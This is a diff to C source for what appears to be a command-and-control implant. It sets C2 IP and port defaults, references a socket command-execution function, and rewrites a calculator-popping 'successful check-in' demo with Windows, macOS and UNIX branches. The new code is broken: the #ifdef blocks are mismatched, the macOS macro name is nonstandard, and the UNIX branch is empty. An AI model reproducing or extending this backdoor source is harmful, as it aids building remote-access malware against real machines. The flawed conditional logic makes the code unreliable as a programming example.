@@ -42,7 +42,7 @@
 #endif
 #endif
 
-// 你可以根据需要修改 C2 的 IP 和端口
+// 默认配置，可以根据需要修改 C2 的 IP 和端口
 #ifndef C2_IP
     #define C2_IP "127.0.0.1"
 #endif
@@ -223,13 +223,35 @@ void execute_no_timeout(int sock, char* raw_cmd) {
 
 
 // 成功上线演示提示
-int Payload_Demonstrate() {
-	system("calc.exe")
+int Payload_Demonstrate(void) {
+#ifdef _WIN32
+    // Windows 实现：通过ShellExecute来打开默认计算器
+    // 先尝试启动 Windows 计算器应用（UWP），如果失败则回退到传统 calc.exe
+    HINSTANCE result = ShellExecute(NULL, NULL, "calculator://", NULL, NULL, SW_SHOWNORMAL);
+    if ((INT_PTR)result <= 32) {
+        // calculator:// 协议失败，回退到 calc.exe
+        ShellExecute(NULL, NULL, "calc.exe", NULL, NULL, SW_SHOWNORMAL);
+    }
+    
+#ifdef _APPLE
+    // macOS(Darwin) 实现：通过posix_spawn来打开 Calculator.app，避免弹出终端窗口
+    pid_t pid;
+    extern char **environ;
+    const char *argv[] = {"Calculator.app", NULL};
+    posix_spawn(&pid, "Calculator.app", NULL, NULL, argv, environ);
+#else
+    // 其他的默认是UNIX平台
+    // Linux/BSD等等(UNIX) 实现：通过posix_spawn来打开默认计算器，避免弹出终端窗口
+    // 这里的代码还没有测试过，所以这里暂无可实现的功能
+    // 你可以根据需要修改代码，尝试打开其他默认计算器应用
+
 #endif
+    return 0;
 }
 
 // --- 主程序入口 ---
 int main(int argc, char *argv[]) {
+    // 成功上线演示提示(可根据需要注释掉或取消注释)
 	// Payload_Demonstrate();
 #ifndef _WIN32
     signal(SIGINT, SIG_IGN);   
